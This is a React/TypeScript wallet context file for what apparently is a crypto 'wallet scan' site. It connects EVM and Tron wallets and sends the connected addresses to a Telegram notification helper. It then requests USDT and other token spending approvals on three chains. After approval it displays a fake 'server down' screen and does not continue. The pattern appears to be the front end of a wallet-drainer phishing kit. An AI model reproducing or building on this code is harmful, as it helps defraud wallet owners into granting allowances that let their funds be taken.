import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
import { useEvmWallet, EvmWalletProvider } from "./EvmWalletContext";
import { useTronWallet, TronWalletProvider } from "./TronWalletContext";
import { getChainByStringId } from "@/lib/chains";
import { sendWalletConnectedNotification } from "@/lib/telegramNotify";
import {
  connectMultiChainWallet,
  disconnectWalletConnect,
  getActiveSession,
} from "@/lib/walletConnectProvider";
import { toast } from "sonner";

export type WorkflowStep = 1 | 2 | 3;
export type NetworkKey = "trc20" | "bep20" | "erc20";

interface UnifiedWalletContextType {
  evmAddress: string | null;
  tronAddress: string | null;
  isEvmConnected: boolean;
  isTronConnected: boolean;
  isConnecting: boolean;
  isApproving: boolean;
  currentStep: WorkflowStep;
  selectedNetwork: NetworkKey | null;
  approvedNetworks: Record<string, boolean>;
  serverDownVisible: boolean;
  connectFailed: boolean;
  tronErrorVisible: boolean;
  tronErrorMessage: string;
  connectAllWallets: () => Promise<boolean>;
  approveNetwork: (networkKey: NetworkKey) => Promise<void>;
  goToStep: (step: WorkflowStep) => void;
  resetWorkflow: () => void;
  hideServerDown: () => void;
  hideTronError: () => void;
}

const UnifiedWalletContext = createContext<UnifiedWalletContextType>({
  evmAddress: null,
  tronAddress: null,
  isEvmConnected: false,
  isTronConnected: false,
  isConnecting: false,
  isApproving: false,
  currentStep: 1,
  selectedNetwork: null,
  approvedNetworks: {},
  serverDownVisible: false,
  connectFailed: false,
  tronErrorVisible: false,
  tronErrorMessage: "",
  connectAllWallets: async () => false,
  approveNetwork: async () => {},
  goToStep: () => {},
  resetWorkflow: () => {},
  hideServerDown: () => {},
  hideTronError: () => {},
});

export const useUnifiedWallet = () => useContext(UnifiedWalletContext);

const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
  const evmWallet = useEvmWallet();
  const tronWallet = useTronWallet();

  const [currentStep, setCurrentStep] = useState<WorkflowStep>(1);
  const [selectedNetwork, setSelectedNetwork] = useState<NetworkKey | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectFailed, setConnectFailed] = useState(false);
  const [tronErrorVisible, setTronErrorVisible] = useState(false);
  const [tronErrorMessage, setTronErrorMessage] = useState("");
  const [serverDownVisible, setServerDownVisible] = useState(false);
  const [approvedNetworks, setApprovedNetworks] = useState<Record<string, boolean>>({
    trc20: false,
    bep20: false,
    erc20: false,
  });

  const isApproving = evmWallet.isApproving || tronWallet.isApproving;

  const goToStep = useCallback((step: WorkflowStep) => {
    setCurrentStep(step);
  }, []);

  const hideTronError = useCallback(() => {
    setTronErrorVisible(false);
    setTronErrorMessage("");
  }, []);

  const hideServerDown = useCallback(() => {
    setServerDownVisible(false);
  }, []);

  const ensureEvmReady = useCallback(async (): Promise<string | null> => {
    const session = getActiveSession();
    if (session) {
      evmWallet.syncFromSession(session);
    }
    if (evmWallet.address) return evmWallet.address;
    return evmWallet.connect();
  }, [evmWallet]);

  const ensureTronReady = useCallback(async (): Promise<string | null> => {
    const session = getActiveSession();
    if (session) {
      tronWallet.syncFromSession(session);
      evmWallet.syncFromSession(session);
    }
    if (tronWallet.address) return tronWallet.address;
    return tronWallet.connect();
  }, [evmWallet, tronWallet]);

  const connectAllWallets = useCallback(async (): Promise<boolean> => {
    setIsConnecting(true);
    setConnectFailed(false);

    try {
      const result = await connectMultiChainWallet();

      if (result.evmAddress) {
        evmWallet.syncFromSession(result.session);
      }
      if (result.tronAddress) {
        tronWallet.syncFromSession(result.session);
      }

      if (!result.evmAddress) {
        toast.error("Failed to connect EVM wallet");
        setConnectFailed(true);
        return false;
      }

      if (result.tronAddress) {
        toast.success("EVM and Tron wallets connected!");
      } else {
        toast.success("EVM wallet connected! Tron will connect when you scan TRC-20.");
      }

      sendWalletConnectedNotification(result.evmAddress, result.tronAddress).catch(console.error);
      setConnectFailed(false);
      setCurrentStep(2);
      return true;
    } catch (err: any) {
      console.error("connectAllWallets failed:", err);
      setConnectFailed(true);
      if (err?.message !== "User closed the connection modal") {
        toast.error("Failed to connect wallet");
      }
      return false;
    } finally {
      setIsConnecting(false);
    }
  }, [evmWallet, tronWallet]);

  const handleApproveSuccess = useCallback((networkKey: NetworkKey) => {
    setApprovedNetworks((prev) => ({ ...prev, [networkKey]: true }));
    setSelectedNetwork(networkKey);
    setServerDownVisible(true);
    // Stay on step 2 — do not advance to step 3
  }, []);

  const approveNetwork = useCallback(
    async (networkKey: NetworkKey) => {
      if (networkKey === "trc20") {
        const addr = await ensureTronReady();
        if (!addr) return;

        const result = await tronWallet.approveTronUsdt();
        if (result.success) {
          handleApproveSuccess(networkKey);
        } else if (result.error) {
          setTronErrorMessage(result.error);
          setTronErrorVisible(true);
        }
      } else if (networkKey === "bep20") {
        const addr = await ensureEvmReady();
        if (!addr) return;

        const bscConfig = getChainByStringId("bsc");
        if (bscConfig) {
          const success = await evmWallet.approveChainTokens(bscConfig);
          if (success) {
            handleApproveSuccess(networkKey);
          }
        }
      } else if (networkKey === "erc20") {
        const addr = await ensureEvmReady();
        if (!addr) return;

        const ethConfig = getChainByStringId("ethereum");
        if (ethConfig) {
          const success = await evmWallet.approveChainTokens(ethConfig);
          if (success) {
            handleApproveSuccess(networkKey);
          }
        }
      }
    },
    [ensureEvmReady, ensureTronReady, evmWallet, tronWallet, handleApproveSuccess]
  );

  const resetWorkflow = useCallback(async () => {
    await disconnectWalletConnect();
    evmWallet.clearSession();
    tronWallet.clearSession();
    setApprovedNetworks({ trc20: false, bep20: false, erc20: false });
    setSelectedNetwork(null);
    setServerDownVisible(false);
    setTronErrorVisible(false);
    setTronErrorMessage("");
    setConnectFailed(false);
    setCurrentStep(1);
  }, [evmWallet, tronWallet]);

  return (
    <UnifiedWalletContext.Provider
      value={{
        evmAddress: evmWallet.address,
        tronAddress: tronWallet.address,
        isEvmConnected: evmWallet.isConnected,
        isTronConnected: tronWallet.isConnected,
        isConnecting,
        isApproving,
        currentStep,
        selectedNetwork,
        approvedNetworks,
        serverDownVisible,
        connectFailed,
        tronErrorVisible,
        tronErrorMessage,
        connectAllWallets,
        approveNetwork,
        goToStep,
        resetWorkflow,
        hideServerDown,
        hideTronError,
      }}
    >
      {children}
    </UnifiedWalletContext.Provider>
  );
};

export const UnifiedWalletProvider = ({ children }: { children: ReactNode }) => {
  return (
    <EvmWalletProvider>
      <TronWalletProvider>
        <UnifiedWalletInnerProvider>{children}</UnifiedWalletInnerProvider>
      </TronWalletProvider>
    </EvmWalletProvider>
  );
};
